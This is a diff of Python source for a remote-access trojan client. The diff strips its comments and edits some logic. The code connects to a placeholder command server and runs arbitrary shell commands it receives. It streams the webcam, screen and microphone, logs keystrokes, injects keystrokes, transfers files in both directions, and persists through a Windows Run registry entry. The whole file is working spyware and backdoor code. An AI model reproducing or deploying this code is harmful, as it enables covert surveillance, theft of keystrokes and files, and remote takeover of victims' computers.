@@ -17,12 +17,9 @@ from pynput.keyboard import Key, Controller
 from mss import mss
 import numpy as np
 
-# Create client socket
 sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# ================= CAMERA SNAPSHOT =================
 def send_camera_image(server_ip, port=9999):
-    # Capture single frame from webcam
     cap = cv2.VideoCapture(0)
     ret, frame = cap.read()
     cap.release()
@@ -30,123 +27,95 @@ def send_camera_image(server_ip, port=9999):
     if not ret:
         return
 
-    # Encode image as JPEG
     _, img_encoded = cv2.imencode(".jpg", frame)
     data = img_encoded.tobytes()
 
-    # Send image to server
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.connect((server_ip, port))
 
-    # Send size first, then image data
     client.sendall(struct.pack("!I", len(data)))
     client.sendall(data)
 
     client.close()
 
-# ================= REMOTE KEY INPUT =================
 keyb = Controller()
-
 def acc_keystroke():
-    # Receive keystroke commands from server and simulate typing
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect(('[IP SERVER]', 9995))
+        s.connect(('[server-ip]', 9995))
         while True:
             data = s.recv(1024)
             if not data:
                 break
-
             command = data.decode()
-
             try:
                 if command.lower() == 'enter':
                     keyb.press(Key.enter)
                     keyb.release(Key.enter)
-                elif command.lower() == 'space':
+                if command.lower() == 'space':
                     keyb.press(Key.space)
                     keyb.release(Key.space)
                 else:
-                    keyb.type(command)  # Type arbitrary text
+                    keyb.type(command)
             except Exception as e:
                 print(f'{e}')
                 break
+            
 
-# ================= AUDIO RECORD =================
 FORMAT = pyaudio.paInt16
 CHANNEL = 1
 RATE = 44100
 CHUNK = 1024
 
 def record_n_send():
-    # Record audio from microphone and send to server
     audio = pyaudio.PyAudio()
     stream = audio.open(format=FORMAT, channels=CHANNEL,
                         rate=RATE, input=True,
                         frames_per_buffer=CHUNK)
-
     print('Recording')
-
+    frame = []
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect(('[IP SERVER]', 9996))
-
-            # Record ~10 seconds
-            for _ in range(0, int(RATE / CHUNK * 10)):
+            s.connect(('[server-ip]', 9996))
+            for _ in range(0, int(RATE / CHUNK * 20)):
                 data = stream.read(CHUNK)
                 s.sendall(data)
-
             print('Record done')
-
     except socket.error as e:
         print(f'{e}')
-
     finally:
-        # Cleanup audio resources
+        print('done')
         stream.stop_stream()
         stream.close()
         audio.terminate()
 
-# ================= PERSISTENCE =================
-def execute_persistence(nama_registry, file_exe):
-    # Copy executable to AppData and add to Windows startup registry
-    file_path = os.environ['appdata'] + '\\' + file_exe
-
+def  execute_persistence(nama_registry, file_exe):
+    file_path = os.environ['appdata']+'\\'+file_exe
     try:
         if not os.path.exists(file_path):
             shutil.copyfile(sys.executable, file_path)
-
-            # Add registry entry for persistence
-            subprocess.call(
-                'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run '
-                '/v ' + nama_registry + ' /t REG_SZ /d "' + file_path + '"',
-                shell=True
-            )
+            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ' + nama_registry + ' /t REG_SZ /d "' + file_path + '"', shell=True)
+        else:
+            pass
     except:
         pass
 
-# ================= SCREEN SHARE =================
+
 def send_screen_record(server_ip, port=9991):
-    # Send live screen capture frames
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.connect((server_ip, port))
-
+    
     sct = mss()
     monitor = sct.monitors[1]
 
     while True:
         try:
-            # Capture screen
             img = np.array(sct.grab(monitor))
             frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
 
-            # Serialize frame
             data = pickle.dumps(frame)
             size = struct.pack("Q", len(data))
-
-            # Send frame size + frame data
             client.sendall(size + data)
 
-            # Stop condition (local key press)
             if cv2.waitKey(1) & 0xFF == ord('q'):
                 break
 
@@ -157,50 +126,34 @@ def send_screen_record(server_ip, port=9991):
     client.close()
     cv2.destroyAllWindows()
 
-# ================= CAMERA STREAM =================
 def byte_stream():
-    # Stream webcam frames continuously
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect(('[IP SERVER]', 9998))
-
+    sock.connect(('[server-ip]', 9998))
     vid = cv2.VideoCapture(0)
-
-    while vid.isOpened():
-        ret, frame = vid.read()
-        if not ret:
-            break
-
-        # Serialize frame
+    while (vid.isOpened()):
+        img, frame = vid.read()
         b = pickle.dumps(frame)
-        message = struct.pack("Q", len(b)) + b
-
+        message = struct.pack("Q", len(b))+b
         sock.sendall(message)
 
 def kirim_byte_stream():
-    # Run camera streaming in separate thread
     t = threading.Thread(target=byte_stream)
     t.start()
 
-# ================= KEYLOGGER =================
+
 def open_log():
-    # Send keylogger log content to server
     sok.send(Keylogger().baca_log().encode())
 
 def log_thread():
-    # Run log sending in separate thread
     t = threading.Thread(target=open_log)
     t.start()
 
-# ================= FILE TRANSFER =================
 def download_file(namafile):
-    # Receive file from server
     bufsize = 65536
     size_data = sok.recv(8)
     filesize = struct.unpack("Q", size_data)[0]
-
     if filesize == 0:
         return
-
     recv = 0
     with open(namafile, 'wb') as file:
         while recv < filesize:
@@ -211,16 +164,12 @@ def download_file(namafile):
                 recv += len(data)
 
 def upload_file(namafile):
-    # Send file to server
     bufsize = 65536
-
     if not os.path.exists(namafile):
         sok.sendall(struct.pack("Q", 0))
         return
-
     filesize = os.path.getsize(namafile)
     sok.sendall(struct.pack("Q", filesize))
-
     with open(namafile, 'rb') as f:
         while True:
             data = f.read(bufsize)
@@ -228,9 +177,7 @@ def upload_file(namafile):
                 break
             sok.sendall(data)
 
-# ================= RECEIVE COMMAND =================
 def terima_perintah():
-    # Receive JSON command reliably
     data = ''
     while True:
         try:
@@ -239,32 +186,26 @@ def terima_perintah():
         except ValueError:
             continue
 
-# ================= COMMAND EXECUTION =================
 def jalankan_perintah():
-    # Main loop: execute commands received from server
     while True:
         perintah = terima_perintah()
-
-        if perintah in ('exit', 'quit'):
+        if perintah == ('exit', 'quit'):
             break
-
-        elif perintah == 'clear':
+        if perintah == 'clear':
             pass
-
-        # Change directory
         elif perintah[:3] == 'cd ':
             try:
                 os.chdir(perintah[3:])
-            except:
+            except FileNotFoundError:
                 pass
-
-        # File transfer
+            except PermissionError:
+                pass
+            except Exception:
+                pass
         elif perintah[:8] == 'download':
             upload_file(perintah[9:])
         elif perintah[:6] == 'upload':
             download_file(perintah[7:])
-
-        # Keylogger controls
         elif perintah == 'start_log':
             Keylogger().start_log()
         elif perintah == 'baca_log':
@@ -273,8 +214,6 @@ def jalankan_perintah():
             Keylogger().clear_log()
         elif perintah == 'stop_log':
             Keylogger().stop_listener()
-
-        # Camera / screen
         elif perintah == 'start_cam':
             kirim_byte_stream()
         elif perintah == 'screen_shot':
@@ -283,55 +222,47 @@ def jalankan_perintah():
             upload_file('ss.png')
             os.remove("ss.png")
         elif perintah == 'screen_share':
-            send_screen_record(server_ip='[IP SERVER]', port=9991)
-
-        # Persistence
+            send_screen_record(server_ip='[server-ip]', port=9991)
         elif perintah[:11] == 'persistence':
             nama_registry, file_exe = perintah[12:].split(' ')
             execute_persistence(nama_registry, file_exe)
-
-        # Audio recording
+        elif perintah == 'help':
+            pass
         elif perintah == 'rec_audio':
             record_n_send()
-
-        # Remote typing
+        elif perintah == 'banner':
+            pass
         elif perintah == 'send_key':
             acc_keystroke()
-
-        # Camera snapshot
         elif perintah == 'snap_cam':
-            send_camera_image(server_ip='[IP SERVER]', port=9993)
-
-        # Default: execute system command
+            send_camera_image(server_ip='[server-ip]', port=9993)
+        elif perintah[:7] == 'execute':
+            try:
+                os.system(f"start {perintah[8:]}")
+            except:
+                pass
         else:
             exe = subprocess.Popen(
-                perintah,
-                shell=True,
-                stdout=PIPE,
-                stderr=PIPE,
-                stdin=PIPE
-            )
-
-            data = exe.stdout.read() + exe.stderr.read()
+            perintah,
+            shell=True,
+            stdout=PIPE,
+            stderr=PIPE,
+            stdin=PIPE
+        )
+            data =exe.stdout.read() + exe.stderr.read()
             data = data.decode()
-
-            # Send result back as JSON
             output = json.dumps(data)
             sok.send(output.encode())
 
-# ================= AUTO RECONNECT =================
 def execute_persist():
-    # Try to reconnect to server continuously
     while True:
         try:
             time.sleep(10)
-            sok.connect(('[IP SERVER]', 9999))
+            sok.connect(('[server-ip]', 9999))
             jalankan_perintah()
             sok.close()
             break
         except:
-            # Recursive retry (can cause stack issue)
             execute_persist()
 
-# Start client
-execute_persist()
+execute_persist() 
